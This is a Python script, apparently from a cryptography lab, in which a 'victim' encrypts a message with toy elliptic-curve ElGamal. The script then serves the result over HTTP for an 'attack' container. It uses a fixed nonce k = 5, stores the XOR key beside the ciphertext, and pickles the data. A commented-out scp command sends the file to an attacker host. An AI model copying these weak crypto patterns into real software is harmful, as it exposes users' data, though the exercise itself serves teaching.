import pickle
import sys
import os
from ecc_utils import Point, multiply_point
import base64
import threading
import hashlib
import subprocess
from ecc_utils import Point, multiply_point
import configparser
import http.server
import socketserver
config = configparser.ConfigParser()
config.read('start.config')
# Nhập các thông số của đường cong
print("Nhap cac thong so cua duong cong:")
print("Nhập a b p (cách nhau bằng khoảng trắng):")
a, b, p = map(int, input().split())

# Nhập tọa độ điểm P
print("Nhập toa độ diem P (x1 y1, cách nhau bằng khoảng trắng):")
x1, y1 = map(int, input().split())
P = Point(x1, y1, a, b, p)

# Nhập khóa bí mật x để mã hóa
print("Nhập khoa bi mat x de ma hoa: ")
x = int(input())

# Tính Q = x * P
Q = multiply_point(P, x)

# In kết quả
print(f"Điểm P: {P}")
print(f"Khóa bí mật x: {x}")
print(f"Điểm Q = x * P: {Q}")


def simple_encrypt(data, key):
    """Mã hóa đơn giản sử dụng XOR với key được mở rộng"""
    key_bytes = hashlib.sha256(str(key).encode()).digest()
    encrypted = bytearray()

    for i, byte in enumerate(data):
        encrypted.append(byte ^ key_bytes[i % len(key_bytes)])

    return bytes(encrypted)


def simple_decrypt(encrypted_data, key):
    """Giải mã đơn giản (XOR là symmetric)"""
    return simple_encrypt(encrypted_data, key)


def is_quadratic_residue(n, p):
    """Kiểm tra xem n có phải là quadratic residue mod p không"""
    if n == 0:
        return True
    return pow(n, (p - 1) // 2, p) == 1


def sqrt_mod_p(n, p):
    """Tính căn bậc hai modular của n mod p"""
    if not is_quadratic_residue(n, p):
        return None
    if p % 4 == 3:
        return pow(n, (p + 1) // 4, p)
    else:
        raise NotImplementedError("Only supports primes p ≡ 3 mod 4")


def map_to_point(m, a, b, p):
    """Ánh xạ message m thành một điểm trên đường cong elliptic"""
    # Thử các giá trị x_m bắt đầu từ m
    for i in range(p):
        x_m = (m + i) % p
        y_squared = (x_m ** 3 + a * x_m + b) % p
        if is_quadratic_residue(y_squared, p):
            y_m = sqrt_mod_p(y_squared, p)
            if y_m is not None:
                return Point(x_m, y_m, a, b, p)
    raise ValueError(f"Cannot map message {m} to a point on the curve")


def encode_message(content, P, Q, p):
    """Mã hóa tin nhắn sử dụng ElGamal trên đường cong elliptic"""
    # Chuyển đổi nội dung thành số
    content_bytes = content.encode('utf-8')
    m = int.from_bytes(content_bytes, 'big') % p

    # Ánh xạ m thành điểm trên đường cong
    try:
        M = map_to_point(m, a, b, p)
        actual_m = M.x  # Lưu m thực tế được sử dụng
    except ValueError:
        # Nếu không ánh xạ được, thử với hash của content
        hash_obj = hashlib.sha256(content_bytes)
        m = int.from_bytes(hash_obj.digest()[:4], 'big') % p
        M = map_to_point(m, a, b, p)
        actual_m = M.x

    # Sinh số ngẫu nhiên k
    k = 5  # Trong thực tế, k nên được sinh ngẫu nhiên

    # Tính C1 = kP và C2 = M + kQ
    C1 = multiply_point(P, k)
    kQ = multiply_point(Q, k)
    C2 = M + kQ

    # Mã hóa nội dung bằng simple encryption
    encrypted_content = simple_encrypt(content_bytes, actual_m)

    # Encode to base64 for storage
    encrypted_content_b64 = base64.b64encode(encrypted_content)

    return C1, C2, encrypted_content_b64, actual_m


def save_message(C1, C2, encrypted_content, m):
    """Lưu tin nhắn đã mã hóa vào file"""
    data = {
        'C1': C1,
        'C2': C2,
        'encrypted_content': encrypted_content,
        'P': P,
        'Q': Q,
        'curve_params': (a, b, p),
        'm': m
    }

    with open("/shared/encrypted_message.pkl", "wb") as f:
         pickle.dump(data, f)
    print(f"Alice: Encrypted message saved to encrypted_message.pkl with m = {m}")

def start_server():
    os.chdir("/shared")
    PORT = 8000
    Handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", PORT), Handler)
    print(f"Victim: Serving HTTP on port {PORT}...")
    httpd.serve_forever()
# #send data
# def send_file_to_attack():
#     # Sử dụng SCP để gửi file sang container attack
#     try:
#         # Lệnh SCP: scp /shared/encrypted_message.pkl attack@192.10.1.19:/shared/
#         result = subprocess.run([
#             "scp", "-o", "StrictHostKeyChecking=no",
#             "/shared/encrypted_message.pkl",
#             "attack@192.10.1.19:/shared/"
#         ], capture_output=True, text=True)
#         if result.returncode == 0:
#             print("Victim: Successfully sent encrypted_message.pkl to attack container")
#         else:
#             print(f"Victim: Failed to send file: {result.stderr}")
#             sys.exit(1)
#     except Exception as e:
#         print(f"Victim: Error sending file: {e}")
    #    sys.exit(1)
#end send data
if __name__ == "__main__":
    print("Alice's Elliptic Curve ElGamal Encryption")
    print(f"Curve parameters: y² = x³ + {a}x + {b} mod {p}")
    print(f"Base point P = {P}")
    print(f"Public key Q = {Q}")

    content = input("Alice: Nhập nội dung cần mã hóa: ")
    if not content.strip():
        content = "Hello World!"
        print(f"Alice: Using default message: {content}")

    print("Alice: Encoding message...")
    try:
        C1, C2, encrypted_content, m = encode_message(content, P, Q, p)
        print(f"Alice: Encoded message successfully")
        print(f"Alice: C1 = {C1}")
        print(f"Alice: C2 = {C2}")
        print(f"Alice: Message mapped to point with x-coordinate = {m}")
        save_message(C1, C2, encrypted_content, m)
    except Exception as e:
        print(f"Alice: Error encoding message: {e}")
        sys.exit(1)
        # Khởi động server HTTP trong một thread riêng
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()

        # Đợi để server chạy và attack tải file
    print("Victim: Waiting for attack to download the file...")
        # Giữ container chạy để server không dừng
    server_thread.join()
